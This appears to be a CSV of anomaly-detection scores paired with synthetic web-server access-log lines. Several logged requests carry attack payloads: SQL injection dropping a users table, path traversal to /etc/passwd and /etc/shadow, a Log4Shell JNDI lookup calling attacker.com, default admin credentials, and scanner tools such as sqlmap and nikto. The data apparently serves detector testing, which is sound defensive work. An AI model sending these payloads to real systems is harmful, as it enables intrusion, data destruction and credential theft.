score_content,score_session,score_fused,line
5.682182312011719,,5.682182312011719,15.168.90.10 - - [10/Jan/2025:12:00:00 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 4958 "-" "curl/7.68.0"
5.825433254241943,,5.825433254241943,13.28.107.46 - - [10/Jan/2025:12:00:05 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2973 "https://example.com/" "curl/7.68.0"
567.8733520507812,,567.8733520507812,93.239.10.24 - - [10/Jan/2025:12:00:09 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 500 1185 "https://example.com/" "python-requests/2.31.0"
3.781101942062378,,3.781101942062378,17.75.121.35 - - [10/Jan/2025:12:00:11 +0100] "GET /about HTTP/1.1" 302 18137 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.720123291015625,,7.720123291015625,28.147.187.251 - - [10/Jan/2025:12:00:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 301 2006 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.850773811340332,,5.850773811340332,67.135.148.160 - - [10/Jan/2025:12:00:18 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10470 "https://www.google.com/" "sqlmap/1.5.10#stable"
5.95314359664917,,5.95314359664917,227.157.60.182 - - [10/Jan/2025:12:00:22 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5995 "https://www.google.com/" "python-requests/2.31.0"
0.18224702775478363,,0.18224702775478363,189.218.54.205 - - [10/Jan/2025:12:00:22 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 201 3964 "https://news.ycombinator.com/" "dirb/2.22"
5.688435077667236,,5.688435077667236,177.73.66.203 - - [10/Jan/2025:12:00:22 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 6692 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.872955322265625,,7.872955322265625,176.86.88.102 - - [10/Jan/2025:12:00:24 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 304 3830 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.89254379272461,,16.89254379272461,235.122.205.10 - - [10/Jan/2025:12:00:25 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 404 981 "https://news.ycombinator.com/" "curl/7.68.0"
5.828123569488525,,5.828123569488525,238.191.15.214 - - [10/Jan/2025:12:00:26 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13664 "https://twitter.com/" "python-requests/2.31.0"
1.7059910297393799,,1.7059910297393799,205.235.228.204 - - [10/Jan/2025:12:00:31 +0100] "GET /admin HTTP/1.1" 200 10969 "-" "sqlmap/1.5.10#stable"
1.7105156183242798,,1.7105156183242798,161.137.216.43 - - [10/Jan/2025:12:00:32 +0100] "GET /admin HTTP/1.1" 200 12395 "https://www.google.com/" "dirb/2.22"
7.905975818634033,,7.905975818634033,182.9.70.106 - - [10/Jan/2025:12:00:36 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 10405 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.849235534667969,,5.849235534667969,45.29.96.201 - - [10/Jan/2025:12:00:37 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10006 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.799248695373535,,3.799248695373535,40.49.88.237 - - [10/Jan/2025:12:00:37 +0100] "GET /admin HTTP/1.1" 304 16485 "https://twitter.com/" "nikto/2.5.0"
2.2999837398529053,,2.2999837398529053,211.252.241.133 - - [10/Jan/2025:12:00:39 +0100] "GET /assets/app.css HTTP/1.1" 304 3319 "https://www.google.com/" "sqlmap/1.5.10#stable"
